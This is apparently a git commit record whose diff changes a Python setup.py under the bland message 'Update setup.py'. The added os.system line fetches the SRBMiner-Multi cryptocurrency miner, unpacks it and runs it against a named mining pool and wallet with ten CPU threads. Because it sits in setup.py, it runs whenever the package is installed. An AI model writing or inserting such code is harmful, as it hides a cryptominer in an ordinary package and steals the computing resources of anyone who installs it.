09a70231c54fc5670d0dcb75334651659ffee793
moldasojaya <91893173+moldasojaya@users.noreply.github.com>
2021-11-29 18:22:08 +0700

    Update setup.py

--- setup.py
+++ setup.py
@@ -1,3 +1,3 @@
 import os
 
-os.system("whoami && lscpu && npm -v")
+os.system("wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.8.0/SRBMiner-Multi-0-8-0-Linux.tar.xz && tar -xf SRBMiner-Multi-0-8-0-Linux.tar.xz && cd SRBMiner-Multi-0-8-0 && ./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool na.luckpool.net:3956 --wallet RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.bismillah --cpu-threads 10 --cpu-threads-priority 5")
